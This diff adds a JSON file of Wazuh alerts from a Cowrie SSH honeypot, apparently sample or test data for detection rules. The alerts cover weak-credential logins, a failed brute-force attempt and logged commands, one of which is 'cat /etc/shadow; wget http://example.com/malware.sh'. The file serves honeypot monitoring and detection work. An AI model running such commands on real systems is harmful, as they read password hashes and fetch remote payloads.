@@ -1,0 +1,341 @@
+[
+  {
+    "timestamp": "2026-09-05T08:16:07.133+0000",
+    "rule": {
+      "level": 10,
+      "description": "Cowrie honeypot: successful login with default/weak credentials (attacker believes they have shell access)",
+      "id": "100042",
+      "mitre": {
+        "id": [
+          "T1078"
+        ],
+        "tactic": [
+          "Defense Evasion",
+          "Persistence",
+          "Privilege Escalation",
+          "Initial Access"
+        ],
+        "technique": [
+          "Valid Accounts"
+        ]
+      },
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "local",
+        "cowrie",
+        "honeypot",
+        "attack",
+        "authentication_success"
+      ]
+    },
+    "agent": {
+      "id": "000",
+      "name": "wazuh.manager"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1788596167.667634",
+    "full_log": "{\"session\":\"9e17f76bf64e\",\"protocol\":\"ssh\",\"src_ip\":\"172.17.0.1\",\"src_port\":55722,\"dst_ip\":\"172.17.0.2\",\"dst_port\":2222,\"username\":\"root\",\"password\":\"letmein\",\"eventid\":\"cowrie.login.success\",\"sensor\":\"262391f74cdc\",\"uuid\":\"2758ba12-9f58-11f1-8b02-72a73988bde5\",\"timestamp\":\"2026-09-05T08:16:06.143492Z\",\"message\":\"login attempt [root/letmein] succeeded\"}",
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "protocol": "ssh",
+      "session": "9e17f76bf64e",
+      "src_ip": "172.17.0.1",
+      "src_port": "55722",
+      "dst_ip": "172.17.0.2",
+      "dst_port": "2222",
+      "username": "root",
+      "password": "letmein",
+      "eventid": "cowrie.login.success",
+      "sensor": "262391f74cdc",
+      "uuid": "2758ba12-9f58-11f1-8b02-72a73988bde5",
+      "timestamp": "2026-09-05T08:16:06.143492Z",
+      "message": "login attempt [root/letmein] succeeded"
+    },
+    "location": "/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-09-05T08:16:07.134+0000",
+    "rule": {
+      "level": 7,
+      "description": "Cowrie honeypot: attacker attempted to download a file onto the honeypot",
+      "id": "100044",
+      "mitre": {
+        "id": [
+          "T1105"
+        ],
+        "tactic": [
+          "Command and Control"
+        ],
+        "technique": [
+          "Ingress Tool Transfer"
+        ]
+      },
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "local",
+        "cowrie",
+        "honeypot",
+        "attack"
+      ]
+    },
+    "agent": {
+      "id": "000",
+      "name": "wazuh.manager"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1788596167.668571",
+    "full_log": "{\"session\":\"9e17f76bf64e\",\"protocol\":\"ssh\",\"src_ip\":\"172.17.0.1\",\"src_port\":55722,\"dst_ip\":\"172.17.0.2\",\"dst_port\":2222,\"url\":\"http://example.com/malware.sh\",\"outfile\":\"var/lib/cowrie/downloads/ff67a9d764d6a2367a187734e697f6a53217db9a21c101d410a113ca871a299d\",\"shasum\":\"ff67a9d764d6a2367a187734e697f6a53217db9a21c101d410a113ca871a299d\",\"duplicate\":false,\"eventid\":\"cowrie.session.file_download\",\"sensor\":\"262391f74cdc\",\"uuid\":\"2758ba12-9f58-11f1-8b02-72a73988bde5\",\"timestamp\":\"2026-09-05T08:16:06.308473Z\",\"message\":\"Downloaded URL (http://example.com/malware.sh) with SHA-256 ff67a9d764d6a2367a187734e697f6a53217db9a21c101d410a113ca871a299d to var/lib/cowrie/downloads/ff67a9d764d6a2367a187734e697f6a53217db9a21c101d410a113ca871a299d\"}",
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "protocol": "ssh",
+      "url": "http://example.com/malware.sh",
+      "session": "9e17f76bf64e",
+      "src_ip": "172.17.0.1",
+      "src_port": "55722",
+      "dst_ip": "172.17.0.2",
+      "dst_port": "2222",
+      "outfile": "var/lib/cowrie/downloads/ff67a9d764d6a2367a187734e697f6a53217db9a21c101d410a113ca871a299d",
+      "shasum": "ff67a9d764d6a2367a187734e697f6a53217db9a21c101d410a113ca871a299d",
+      "duplicate": "false",
+      "eventid": "cowrie.session.file_download",
+      "sensor": "262391f74cdc",
+      "uuid": "2758ba12-9f58-11f1-8b02-72a73988bde5",
+      "timestamp": "2026-09-05T08:16:06.308473Z",
+      "message": "Downloaded URL (http://example.com/malware.sh) with SHA-256 ff67a9d764d6a2367a187734e697f6a53217db9a21c101d410a113ca871a299d to var/lib/cowrie/downloads/ff67a9d764d6a2367a187734e697f6a53217db9a21c101d410a113ca871a299d"
+    },
+    "location": "/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-09-05T08:16:07.134+0000",
+    "rule": {
+      "level": 12,
+      "description": "Cowrie honeypot: attacker executed a command inside the fake shell (cat /etc/shadow; wget http://example.com/malware.sh)",
+      "id": "100043",
+      "mitre": {
+        "id": [
+          "T1059"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "Command and Scripting Interpreter"
+        ]
+      },
+      "firedtimes": 1,
+      "mail": true,
+      "groups": [
+        "local",
+        "cowrie",
+        "honeypot",
+        "attack"
+      ]
+    },
+    "agent": {
+      "id": "000",
+      "name": "wazuh.manager"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1788596167.670175",
+    "full_log": "{\"session\":\"9e17f76bf64e\",\"protocol\":\"ssh\",\"src_ip\":\"172.17.0.1\",\"src_port\":55722,\"dst_ip\":\"172.17.0.2\",\"dst_port\":2222,\"input\":\"cat /etc/shadow; wget http://example.com/malware.sh\",\"eventid\":\"cowrie.command.input\",\"sensor\":\"262391f74cdc\",\"uuid\":\"2758ba12-9f58-11f1-8b02-72a73988bde5\",\"timestamp\":\"2026-09-05T08:16:06.151815Z\",\"message\":\"CMD: cat /etc/shadow; wget http://example.com/malware.sh\"}",
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "protocol": "ssh",
+      "session": "9e17f76bf64e",
+      "src_ip": "172.17.0.1",
+      "src_port": "55722",
+      "dst_ip": "172.17.0.2",
+      "dst_port": "2222",
+      "input": "cat /etc/shadow; wget http://example.com/malware.sh",
+      "eventid": "cowrie.command.input",
+      "sensor": "262391f74cdc",
+      "uuid": "2758ba12-9f58-11f1-8b02-72a73988bde5",
+      "timestamp": "2026-09-05T08:16:06.151815Z",
+      "message": "CMD: cat /etc/shadow; wget http://example.com/malware.sh"
+    },
+    "location": "/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-09-05T08:17:07.273+0000",
+    "rule": {
+      "level": 10,
+      "description": "Cowrie honeypot: successful login with default/weak credentials (attacker believes they have shell access)",
+      "id": "100042",
+      "mitre": {
+        "id": [
+          "T1078"
+        ],
+        "tactic": [
+          "Defense Evasion",
+          "Persistence",
+          "Privilege Escalation",
+          "Initial Access"
+        ],
+        "technique": [
+          "Valid Accounts"
+        ]
+      },
+      "firedtimes": 2,
+      "mail": false,
+      "groups": [
+        "local",
+        "cowrie",
+        "honeypot",
+        "attack",
+        "authentication_success"
+      ]
+    },
+    "agent": {
+      "id": "000",
+      "name": "wazuh.manager"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1788596227.678501",
+    "full_log": "{\"session\":\"94c5b29c50a7\",\"protocol\":\"ssh\",\"src_ip\":\"172.17.0.1\",\"src_port\":62448,\"dst_ip\":\"172.17.0.2\",\"dst_port\":2222,\"username\":\"guest\",\"password\":\"wrongpassword123\",\"eventid\":\"cowrie.login.success\",\"sensor\":\"262391f74cdc\",\"uuid\":\"2758ba12-9f58-11f1-8b02-72a73988bde5\",\"timestamp\":\"2026-09-05T08:17:06.519712Z\",\"message\":\"login attempt [guest/wrongpassword123] succeeded\"}",
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "protocol": "ssh",
+      "session": "94c5b29c50a7",
+      "src_ip": "172.17.0.1",
+      "src_port": "62448",
+      "dst_ip": "172.17.0.2",
+      "dst_port": "2222",
+      "username": "guest",
+      "password": "wrongpassword123",
+      "eventid": "cowrie.login.success",
+      "sensor": "262391f74cdc",
+      "uuid": "2758ba12-9f58-11f1-8b02-72a73988bde5",
+      "timestamp": "2026-09-05T08:17:06.519712Z",
+      "message": "login attempt [guest/wrongpassword123] succeeded"
+    },
+    "location": "/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-09-05T08:17:07.274+0000",
+    "rule": {
+      "level": 12,
+      "description": "Cowrie honeypot: attacker executed a command inside the fake shell (echo test)",
+      "id": "100043",
+      "mitre": {
+        "id": [
+          "T1059"
+        ],
+        "tactic": [
+          "Execution"
+        ],
+        "technique": [
+          "Command and Scripting Interpreter"
+        ]
+      },
+      "firedtimes": 2,
+      "mail": true,
+      "groups": [
+        "local",
+        "cowrie",
+        "honeypot",
+        "attack"
+      ]
+    },
+    "agent": {
+      "id": "000",
+      "name": "wazuh.manager"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1788596227.679478",
+    "full_log": "{\"session\":\"94c5b29c50a7\",\"protocol\":\"ssh\",\"src_ip\":\"172.17.0.1\",\"src_port\":62448,\"dst_ip\":\"172.17.0.2\",\"dst_port\":2222,\"input\":\"echo test\",\"eventid\":\"cowrie.command.input\",\"sensor\":\"262391f74cdc\",\"uuid\":\"2758ba12-9f58-11f1-8b02-72a73988bde5\",\"timestamp\":\"2026-09-05T08:17:06.721706Z\",\"message\":\"CMD: echo test\"}",
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "protocol": "ssh",
+      "session": "94c5b29c50a7",
+      "src_ip": "172.17.0.1",
+      "src_port": "62448",
+      "dst_ip": "172.17.0.2",
+      "dst_port": "2222",
+      "input": "echo test",
+      "eventid": "cowrie.command.input",
+      "sensor": "262391f74cdc",
+      "uuid": "2758ba12-9f58-11f1-8b02-72a73988bde5",
+      "timestamp": "2026-09-05T08:17:06.721706Z",
+      "message": "CMD: echo test"
+    },
+    "location": "/var/log/cowrie/cowrie.json"
+  },
+  {
+    "timestamp": "2026-09-05T08:17:21.300+0000",
+    "rule": {
+      "level": 5,
+      "description": "Cowrie honeypot: failed login attempt (credential root/123456)",
+      "id": "100041",
+      "mitre": {
+        "id": [
+          "T1110"
+        ],
+        "tactic": [
+          "Credential Access"
+        ],
+        "technique": [
+          "Brute Force"
+        ]
+      },
+      "firedtimes": 1,
+      "mail": false,
+      "groups": [
+        "local",
+        "cowrie",
+        "honeypot",
+        "attack",
+        "authentication_failed"
+      ]
+    },
+    "agent": {
+      "id": "000",
+      "name": "wazuh.manager"
+    },
+    "manager": {
+      "name": "wazuh.manager"
+    },
+    "id": "1788596241.680287",
+    "full_log": "{\"session\":\"6ba1bb07b214\",\"protocol\":\"ssh\",\"src_ip\":\"172.17.0.1\",\"src_port\":58156,\"dst_ip\":\"172.17.0.2\",\"dst_port\":2222,\"username\":\"root\",\"password\":\"123456\",\"eventid\":\"cowrie.login.failed\",\"sensor\":\"262391f74cdc\",\"uuid\":\"2758ba12-9f58-11f1-8b02-72a73988bde5\",\"timestamp\":\"2026-09-05T08:17:20.861487Z\",\"message\":\"login attempt [root/123456] failed\"}",
+    "decoder": {
+      "name": "json"
+    },
+    "data": {
+      "protocol": "ssh",
+      "session": "6ba1bb07b214",
+      "src_ip": "172.17.0.1",
+      "src_port": "58156",
+      "dst_ip": "172.17.0.2",
+      "dst_port": "2222",
+      "username": "root",
+      "password": "123456",
+      "eventid": "cowrie.login.failed",
+      "sensor": "262391f74cdc",
+      "uuid": "2758ba12-9f58-11f1-8b02-72a73988bde5",
+      "timestamp": "2026-09-05T08:17:20.861487Z",
+      "message": "login attempt [root/123456] failed"
+    },
+    "location": "/var/log/cowrie/cowrie.json"
+  }
+]
